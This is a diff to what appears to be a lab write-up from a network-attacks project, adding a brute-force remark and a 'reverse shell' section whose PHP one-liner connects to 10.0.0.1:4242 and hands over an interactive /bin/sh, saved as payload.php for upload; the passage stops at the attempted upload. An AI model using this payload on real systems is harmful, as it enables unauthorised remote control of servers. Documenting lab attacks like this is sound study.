@@ -201,3 +201,19 @@ And we have our login credentials!
 ​	We go to the page in Firefox and enter our credentials, and are presented with index.php.
 
 ![postresult](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/index.PNG)
+
+I guess this Brute Force section would have been much easier to exploit.
+
+![postresult](https://git.rjphillips.online/main/networkattacksproject/-/raw/main/target2/screens/easy.PNG)
+
+
+
+##### C. Obtaining a reverse shell
+
+​	After the length of time on this target just to get to this point, I tried a one-liner PHP shell from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php).
+
+```php
+php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+```
+
+Saved as payload.php, and attempted to upload. 
